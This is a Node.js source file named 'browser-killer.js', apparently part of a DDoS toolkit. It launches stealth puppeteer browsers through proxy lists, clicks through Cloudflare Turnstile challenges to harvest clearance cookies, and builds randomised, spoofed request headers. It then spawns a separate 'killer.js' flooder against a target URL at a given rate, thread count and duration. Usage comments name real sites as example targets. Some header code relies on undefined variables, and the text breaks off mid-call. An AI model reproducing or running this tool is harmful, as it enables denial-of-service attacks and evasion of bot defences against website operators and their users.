const errorHandler = error => {
	console.log(error);
};
// npm i async puppeteer puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-core hpack

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
	const index = this.indexOf(item);
	if (index !== -1) {
		this.splice(index, 1);
	}
	return item;
}
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const os = require("os");
const generateLargeData = () => crypto.randomBytes(1024 * 1024).toString('hex');
const COOKIES_MAX_RETRIES = 1;
const async = require("async");
const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);

//  node browser-killer.js URL thread proxyfile rate time
// https://dstatlove.ink/hit 30 proxy.txt 64 120

// node browser-killer.js https://search.censys.io/ 10 proxy.txt 30 300
const targetURL = process.argv[2];
const threads = +process.argv[3];
// const proxiesCount = process.argv[4];
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = process.argv[6];
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const { spawn } = require("child_process");
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);


const randList = list => list[Math.floor(Math.random() * list.length)];

// console.log(proxyFile);
const proxies = readLines(proxyFile);

// console.log(proxies);

const colors = {
	COLOR_RED: "\x1b[31m",
	COLOR_GREEN: "\x1b[32m",
	COLOR_YELLOW: "\x1b[33m",
	COLOR_BLACK: "\x1b[30m",
	COLOR_BLUE: "\x1b[34m",
	COLOR_MAGENTA: "\x1b[35m",
	COLOR_CYAN: "\x1b[36m",
	COLOR_WHITE: "\x1b[37m",
	COLOR_RESET: "\x1b[0m"
};

function colored(colorCode, text) {
	console.log(colorCode + text + colors.COLOR_RESET);
};

function getCurrentTime() {
	const now = new Date();
	const gmt7Offset = 7 * 60 * 60 * 1000;
	const localTime = new Date(now.getTime() + gmt7Offset);
	return localTime.toISOString().substr(11, 8); // Get HH:MM:SS
}

async function detectChallenge(browserProxy, page) {
	const title = await page.title();
	const content = await page.content();
	const timestamp = getCurrentTime();
	if (title === "Attention Required! | Cloudflare") {
		throw new Error(`${timestamp} \x1b[46m | \x1b[0m ${browserProxy} \x1b[46m | \x1b[0m Proxy blocked`);
	}
	if (content.includes("challenge-platform") === true) {
		colored(colors.COLOR_BLUE, `${timestamp} \x1b[33m FOUND challenge\x1b[42m\x1b[0m ${browserProxy} \x1b[0m`);
		try {
			await sleep(15);
			const elements = await page.$$('[name="cf-turnstile-response"]');
			if (elements.length <= 0) {
				const coordinates = await page.evaluate(() => {
					let coordinates = [];
					document.querySelectorAll("div").forEach((item) => {
						try {
							let itemCoordinates = item.getBoundingClientRect();
							let itemCss = window.getComputedStyle(item);
							if (
								itemCss.margin == "0px" &&
								itemCss.padding == "0px" &&
								itemCoordinates.width > 290 &&
								itemCoordinates.width <= 310 &&
								!item.querySelector("*")
							) {
								coordinates.push({
									x: itemCoordinates.x,
									y: item.getBoundingClientRect().y,
									w: item.getBoundingClientRect().width,
									h: item.getBoundingClientRect().height,
								});
							}
						} catch (err) { }
					});

					if (coordinates.length <= 0) {
						document.querySelectorAll("div").forEach((item) => {
							try {
								let itemCoordinates = item.getBoundingClientRect();
								if (
									itemCoordinates.width > 290 &&
									itemCoordinates.width <= 310 &&
									!item.querySelector("*")
								) {
									coordinates.push({
										x: itemCoordinates.x,
										y: item.getBoundingClientRect().y,
										w: item.getBoundingClientRect().width,
										h: item.getBoundingClientRect().height,
									});
								}
							} catch (err) { }
						});
					}
					return coordinates;
				});
				for (const item of coordinates) {
					try {
						let x = item.x + 30;
						let y = item.y + item.h / 2;
						await page.mouse.click(x, y);
					} catch (err) { }
				}
			}
			for (const element of elements) {
				try {
					const parentElement = await element.evaluateHandle(
						(el) => el.parentElement
					);
					const box = await parentElement.boundingBox();
					let x = box.x + 30;
					let y = box.y + box.height / 2;
					await page.mouse.click(x, y);
				} catch (err) { }
			}
		} finally {
			await sleep(15);
			return;
		}
	}
	colored(colors.COLOR_CYAN, `${timestamp} \x1b[46m | \x1b[0m ${browserProxy} \x1b[46m | \x1b[0m \x1b[40m No challenge detected \x1b[0m`);
	await sleep(10);
	return;
}

const userAgents = [
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4',
	'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',

	'Mozilla/5.0 (Linux; Android 14; SM-S721B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-X920N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-X826N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-F956B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-F741N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-F958N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-A047F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-A042M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	
	'Mozilla/5.0 (Linux; Android 14; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',

	'Mozilla/5.0 (Linux; Android 14; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Android 14; Mobile; rv:68.0) Gecko/68.0 Firefox/118.0',
	'Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:118.0) Gecko/118.0 Firefox/118.0',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/118.0 Mobile/15E148 Safari/605.1.15',
	'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
	'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
	'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
	'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/117.2045.65 Mobile/15E148 Safari/605.1.15'
];

function detectProxyFormat(proxyString) {
    const formats = {
        "username:password@host:port": /^(\w+):(\w+)@([\w.-]+):(\d+)$/,
        "host:port:username:password": /^([\w.-]+):(\d+):(\w+):(\w+)$/,
        "host:port": /^([\w.-]+):(\d+)$/
    };

    for (const [format, regex] of Object.entries(formats)) {
        const match = proxyString.match(regex);
        if (match) {
            let username = "";
            let password = "";
            let host = "";
            let port = "";

            switch (format) {
                case "username:password@host:port":
                    username = match[1];
                    password = match[2];
                    host = match[3];
                    port = match[4];
                    break;
                case "host:port:username:password":
                    host = match[1];
                    port = match[2];
                    username = match[3];
                    password = match[4];
                    break;
                case "host:port":
                    host = match[1];
                    port = match[2];
                    break;
            }

            return `${username || "myUsername"}:${password || "myPassword"}@${host}:${port}`;
        }
    }

    return null; // Không phát hiện được định dạng
}

async function openBrowser(targetURL, browserProxy) {
	const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

	// console.log("UA:",userAgent);

	const promise = async (resolve, reject) => {
		let username = "";
		let password = "";

		const proxyMatch = browserProxy.match(/^(?:(.*?):(.*?)@)?([\w.-]+):(\d+)$/);
        if (proxyMatch) {
            username = proxyMatch[1] || ""; // Username if available
            password = proxyMatch[2] || ""; // Password if available
            host = proxyMatch[3]; // Host
            port = proxyMatch[4]; // Port
        } else {
            reject("Invalid proxy format. Expected format: username:password@host:port or host:port");
            return;
        }

        const proxyServer = `${host}:${port}`;

		const options = {
			headless: "new",
			ignoreHTTPSErrors: true,
			args: [
				"--proxy-server=http://" + proxyServer,
				"--no-sandbox",
				"--no-first-run",
				"--ignore-certificate-errors",
				"--disable-extensions",
				"--test-type",
				"--user-agent=" + userAgent
			]
		};
		
		const browser = await puppeteer.launch(options);

		
		
		try {

			const [page] = await browser.pages();
			if (username && password){
				await page.authenticate({ username, password });
			}
			const client = page._client();
			const accept_header = [
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
				'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
				'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
				'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
				'text/html; charset=utf-8',
				'application/json, text/plain, */*',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
				'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
			];
			lang_header = [
				'ko-KR',
				'en-US',
				'zh-CN',
				'zh-TW',
				'ja-JP',
				'en-GB',
				'en-AU',
				'en-GB,en-US;q=0.9,en;q=0.8',
				'en-GB,en;q=0.5',
				'en-CA',
				'en-UK, en, de;q=0.5',
				'en-NZ',
				'en-GB,en;q=0.6',
				'en-ZA',
				'en-IN',
				'en-PH',
				'en-SG',
				'en-HK',
				'en-GB,en;q=0.8',
				'en-GB,en;q=0.9',
				' en-GB,en;q=0.7',
				'*',
				'en-US,en;q=0.5',
				'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
				'utf-8, iso-8859-1;q=0.5, *;q=0.1',
				'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
				'en-GB, en-US, en;q=0.9',
				'de-AT, de-DE;q=0.9, en;q=0.5',
				'cs;q=0.5',
				'da, en-gb;q=0.8, en;q=0.7',
				'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
				'en-US,en;q=0.9',
				'de-CH;q=0.7',
				'tr',
				'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
			];

			const encoding_header = [
				'*',
				'*/*',
				'gzip',
				'gzip, deflate, br',
				'compress, gzip',
				'deflate, gzip',
				'gzip, identity',
				'gzip, deflate',
				'br',
				'br;q=1.0, gzip;q=0.8, *;q=0.1',
				'gzip;q=1.0, identity; q=0.5, *;q=0',
				'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
				'compress;q=0.5, gzip;q=1.0',
				'identity',
				'gzip, compress',
				'compress, deflate',
				'compress',
				'gzip, deflate, br',
				'deflate',
				'gzip, deflate, lzma, sdch',
				'deflate',
			];
			const control_header = [
				'max-age=604800',
				'proxy-revalidate',
				'public, max-age=0',
				'max-age=315360000',
				'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
				's-maxage=604800',
				'max-stale',
				'public, immutable, max-age=31536000',
				'must-revalidate',
				'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
				'max-age=31536000,public,immutable',
				'max-age=31536000,public',
				'min-fresh',
				'private',
				'public',
				's-maxage',
				'no-cache',
				'no-cache, no-transform',
				'max-age=2592000',
				'no-store',
				'no-transform',
				'max-age=31557600',
				'stale-if-error',
				'only-if-cached',
				'max-age=0',
			];
			const nm = [
				"110.0.0.0",
				"111.0.0.0",
				"112.0.0.0",
				"113.0.0.0",
				"114.0.0.0",
				"115.0.0.0",
				"116.0.0.0",
				"117.0.0.0",
				"118.0.0.0",
				"119.0.0.0",
			];
			const nmx = [
				"120.0",
				"119.0",
				"118.0",
				"117.0",
				"116.0",
				"115.0",
				"114.0",
				"113.0",
				"112.0",
				"111.0",
			];
			const nmx1 = [
				"105.0.0.0",
				"104.0.0.0",
				"103.0.0.0",
				"102.0.0.0",
				"101.0.0.0",
				"100.0.0.0",
				"99.0.0.0",
				"98.0.0.0",
				"97.0.0.0",
			];
			const sysos = [
				"Windows 1.01",
				"Windows 1.02",
				"Windows 1.03",
				"Windows 1.04",
				"Windows 2.01",
				"Windows 3.0",
				"Windows NT 3.1",
				"Windows NT 3.5",
				"Windows 95",
				"Windows 98",
				"Windows 2006",
				"Windows NT 4.0",
				"Windows 95 Edition",
				"Windows 98 Edition",
				"Windows Me",
				"Windows Business",
				"Windows XP",
				"Windows 7",
				"Windows 8",
				"Windows 10 version 1507",
				"Windows 10 version 1511",
				"Windows 10 version 1607",
				"Windows 10 version 1703",
			];
			const winarch = [
				"x86-16",
				"x86-16, IA32",
				"IA-32",
				"IA-32, Alpha, MIPS",
				"IA-32, Alpha, MIPS, PowerPC",
				"Itanium",
				"x86_64",
				"IA-32, x86-64",
				"IA-32, x86-64, ARM64",
				"x86-64, ARM64",
				"ARMv4, MIPS, SH-3",
				"ARMv4",
				"ARMv5",
				"ARMv7",
				"IA-32, x86-64, Itanium",
				"IA-32, x86-64, Itanium",
				"x86-64, Itanium",
			];
			const winch = [
				"Weak Build; Servera/251A",
				"Weak Build; Servera/252A",
				"Weak Build; Servera/583C",
				"N1011; ServerBuilder/19X",
				"N1011; ServerBuilder/33X",
				"N1011 Sports; Server/82A",
				"N1011 Sports; ServeB/82A",
			];

			var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
			var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
			var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
			var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
			var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
			var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];

			const uap = [
				"Mozilla/5.0 (Windows NT 10.0; " + nm5 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + `${Math.floor(Math.random() * (120 - 104 + 1)) + 104}` + ".0.0.0 Safari/537.36",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Apple/537.36 (KHTML, like Gecko) Chrome/" + `${Math.floor(Math.random() * (120 - 104 + 1)) + 104}` + ".0.0.0 Safari/537.36",
			];

			const platformd = [
				"Windows",
				"Linux",
				"Android",
				"iOS",
				"Mac OS",
				"iPadOS",
				"BlackBerry OS",
				"Firefox OS",
			];

			const rdom2 = [
				"hello server",
				"hello cloudflare",
				"hello client",
				"hello world",
				"hello akamai",
				"hello cdnfly",
				"hello kitty"
			];

			const patch = [
				'application/json-patch+json',
				'application/xml-patch+xml',
				'application/merge-patch+json',
				'application/vnd.github.v3+json',
				'application/vnd.mozilla.xul+xml',
				'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
				'application/vnd.oasis.opendocument.text',
				'application/vnd.sun.xml.writer',
				'text/x-diff',
				'text/x-patch'
			];

			const uaa = [
				'"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
				'"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
				'"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
				'"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
				'"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
				'"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
				'"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"',
			];

			const pua = [
				"Linux",
				"Windows",
				"Mac OS",
			];

			const nua = [
				"SA/3 Mobile",
				"Mobile",
				"Mobile Windows",
			];

			const langua = [
				"; en-US",
				"; ko-KR",
				"; en-US",
				"; zh-CN",
				"; zh-TW",
				"; ja-JP",
				"; en-GB",
				"; en-AU",
				"; en-CA",
				"; en-NZ",
				"; en-ZA",
				"; en-IN",
				"; en-PH",
				"; en-SG",
				"; en-HK",
			];
			
			

			page.on("framenavigated", (frame) => {
				if (frame.url().includes("challenges.cloudflare.com") === true) client.send("Target.detachFromTarget", { targetId: frame._id });
			});

			page.setDefaultNavigationTimeout(60 * 1000);

			const userAgent = await page.evaluate(function () {
				return navigator.userAgent;
			});

			await page.goto(targetURL, {
				waitUntil: "domcontentloaded"
			});


			await detectChallenge(browserProxy, page, reject);
			const title = await page.title();
			const cookies = await page.cookies(targetURL);

			// console.log("TITLE",title);
			// await page.screenshot({ path: 'apify.jpeg', fullPage: true });

			resolve({
				title: title,
				browserProxy: browserProxy,
				cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
				userAgent: userAgent
			});

		} catch (exception) {
		} finally {
			await browser.close();
		}
	};
	return new Promise(promise);
}

// async function openBrowser(targetURL, browserProxy) {
//     const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
//     // console.log("UA:", userAgent);

//     const promise = async (resolve, reject) => {
// 		let username = "";
// 		let password = "";

// 		const proxyMatch = browserProxy.match(/^(?:(.*?):(.*?)@)?([\w.-]+):(\d+)$/);
//         if (proxyMatch) {
//             username = proxyMatch[1] || ""; // Username if available
//             password = proxyMatch[2] || ""; // Password if available
//             host = proxyMatch[3]; // Host
//             port = proxyMatch[4]; // Port
//         } else {
//             reject("Invalid proxy format. Expected format: username:password@host:port or host:port");
//             return;
//         }

//         const proxyServer = `${host}:${port}`;


//         const options = {
//             headless: "new",
//             ignoreHTTPSErrors: true,
//             args: [
//                 "--proxy-server=http://" + proxyServer,
//                 "--no-sandbox",
//                 "--no-first-run",
//                 "--ignore-certificate-errors",
//                 "--disable-extensions",
//                 "--test-type",
//                 "--user-agent=" + userAgent
//             ]
//         };
//         const browser = await puppeteer.launch(options);

//         try {
//             const [page] = await browser.pages();
			
// 			if (username && password){
// 				await page.authenticate({ username, password });
// 			}

//             page.setDefaultNavigationTimeout(60 * 1000);

//             // Navigate to the target URL
//             const response = await page.goto(targetURL, {
//                 waitUntil: "domcontentloaded"
//             });

//             // Check HTTP status
//             const status = response.status();
//             if (status < 200 || status >= 400) {
//                 reject(`Failed to load page. HTTP Status: ${status}`);
//                 return;
//             }

//             // Get page title
//             const title = await page.title();
//             if (!title) {
//                 reject("Page title is empty. Navigation might have failed.");
//                 return;
//             }

//             // Check for specific content or elements
//             const pageContent = await page.content();
//             if (!pageContent.includes("Expected content or keyword")) {
//                 reject("Page does not contain expected content.");
//                 return;
//             }

//             // Resolve success with details
//             resolve({
//                 title: title,
//                 browserProxy: browserProxy,
//                 cookies: (await page.cookies(targetURL))
//                     .map(cookie => cookie.name + "=" + cookie.value)
//                     .join("; ")
//                     .trim(),
//                 userAgent: userAgent
//             });
//         } catch (exception) {
//             reject(`Error occurred: ${exception.message}`);
//         } finally {
//             await browser.close();
//         }
//     };

//     return new Promise(promise);
// }


async function startThread(targetURL, browserProxy, task, done, retries = 0) {
	browserProxy = detectProxyFormat(browserProxy);

	if (retries === COOKIES_MAX_RETRIES) {
		const currentTask = queue.length();
		done(null, { task, currentTask });
	} else {
		
		try {
			const response = await openBrowser(targetURL, browserProxy);

			// console.log(response);
			const FA = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
				'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
				'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
				'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
				'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
				'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
				'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
				'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
			const FAB = ['X-Client-IP', 'Accepted', 'AccessKey', 'Age', 'Akamai-origin-hop', 'App', 'App-Env', 'Base-url', 'Basic', 'Cache-Info', 'Case-filter', 'Catalog-Server', 'Client-Address', 'Challenge-Response', 'CF-IP', 'CF-Temp-Path'];
			const mad = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
				'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
				'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
				'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
				'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
				'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
				'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
				'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
			
			
			if (response) {
				
				if (response.title === "Just a moment...") {
					console.log("\x1b[31mBROWSER : " + browserProxy + " - failed \x1b[37m ");
					var FA1 = FA[Math.floor(Math.floor(Math.random() * FA.length))];
					var FAB1 = FAB[Math.floor(Math.floor(Math.random() * FAB.length))];
					var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
					var nua1 = nua[Math.floor(Math.floor(Math.random() * nua.length))];
					var mad1 = mad[Math.floor(Math.floor(Math.random() * mad.length))];
					var langua1 = langua[Math.floor(Math.floor(Math.random() * langua.length))];
					var random = rdom2[Math.floor(Math.floor(Math.random() * rdom2.length))];
					var patched = patch[Math.floor(Math.floor(Math.random() * patch.length))];
					var platformx = platformd[Math.floor(Math.floor(Math.random() * platformd.length))];
					var uaas = uaa[Math.floor(Math.floor(Math.random() * uaa.length))];
					var puaa = pua[Math.floor(Math.floor(Math.random() * pua.length))];
					var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
					var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
					var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
					var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
					var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
					var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
					const parsedTarget = url.parse(args.targetURL);
					function taoDoiTuongNgauNhien() {
						const doiTuong = {};
						const kyTuNgauNhien = 'abcdefghijk';
						const kyTuNgauNhienk = '123456789';
						kill = Math.floor(Math.random() * (30 - 5 + 1)) + 5;
						for (let i = 1; i <= kill; i++) {
							const key = 'Sec-' + kyTuNgauNhien[Math.floor(Math.random() * kyTuNgauNhien.length)];
							const value = 'Public-Age=' + kyTuNgauNhienk[Math.floor(Math.random() * kyTuNgauNhienk.length)];
							doiTuong[key] = value;
						}

						return doiTuong;
					}


					function taoDoiTuongNgauNhiens() {
						const doiTuong = {};
						const kyTuNgauNhien = '123456789';
						const mathop = 'lmnopqrstuvwxyz123456789';
						kik = Math.floor(Math.random() * (30 - 5 + 1)) + 5;
						for (let i = 1; i <= kik; i++) {
							const key = generateRandomString(1, 4) + '-' + mathop[Math.floor(Math.random() * mathop.length)];
							const value = 'max-age=' + kyTuNgauNhien[Math.floor(Math.random() * kyTuNgauNhien.length)];

							doiTuong[key] = value;
						}

						return doiTuong;
					}


					const doiTuongNgauNhien = taoDoiTuongNgauNhien();
					const rateHeaders = [
						{ "vtl": "s-maxage=9800" },
						{ "X-Forwarded-For": spoofed },
						{ "Accept-Transfer": "gzip" },
						{ "Virtual.machine": "Encode" },
					];
					const rateHeaders2 = [
						{ "TTL-3": "1.5" },
						{ "Geo-Stats": "USA" },
					];
					const rateHeaders3 = [
						{ "X-pop": "?vddos-challenge=" + generateRandomString(2, 9) + "-" + generateRandomString(4, 8) },
						{ "X-Geo": "?lang-country=" + generateRandomString(2, 9) + "-" + generateRandomString(4, 8) },
						{ "X-Curse": "?Curse-level=" + generateRandomString(2, 9) + "-" + generateRandomString(4, 8) },
					];
					const rateHeaders4 = [
						{ "Delta-reset": "{nel-reset};" + generateRandomString(2, 9) + "-" + generateRandomString(4, 8) },
						{ "Retrict-Base": "{max-public=0};" + generateRandomString(2, 9) + "-" + generateRandomString(4, 8) },
					];

					const rhd = [
						{ 'RTT': Math.floor(Math.random() * (400 - 600 + 1)) + 100 },
						{ 'Nel': '{ "report_to": "name_of_reporting_group", "max_age": 12345, "include_subdomains": false, "success_fraction": 0.0, "failure_fraction": 1.0 }' },
						{ "referer": "https://" + parsedTarget.host + "?cf_chl_tk=" + generateRandomString(15, 20) },
					]
					const hd1 = [
						{ 'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none' },
						{ 'Delta-Base': '12340001' },
						{ "te": "trailers" },
						{ "accept-language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3" }
					]

					var multi = taoDoiTuongNgauNhiens();
					var multi1 = taoDoiTuongNgauNhien();
					var multi2 = FA1 + "-" + FAB1 + ": " + mad1 + "-" + generateRandomString(4, 25);
					var multi3 = FA1 + "-" + FAB1 + ": " + mad1 + "-" + generateRandomString(4, 25);
					const headerr = {
						":method": "GET",
						":authority": parsedTarget.host,
						":scheme": "https",
						":path": path,
						"cache-control": "max-age=0",
						"upgrade-insecure-requests": "1",
						"user-agent": uap1,
					}

					return;
				}

				const cookies =
					"------ \n" + 
					"\x1b[36m TARGET INFORMATION : \x1b[0m" +
					"\n\x1b[32m [Tittle] : \x1b[36m" + response.title +
					"\n\x1b[32m [Proxy] : \x1b[0m" + response.browserProxy +
					"\n\x1b[32m [User-Agent] : \x1b[0m" + response.userAgent +
					"\n\x1b[31m [Cookie-Solved] : \x1b[37m" + response.cookies +
					"\n------";

				console.log(cookies);

				spawn("node", [
					"killer.js",
					targetURL,
					duration,
					rates,
					threads,
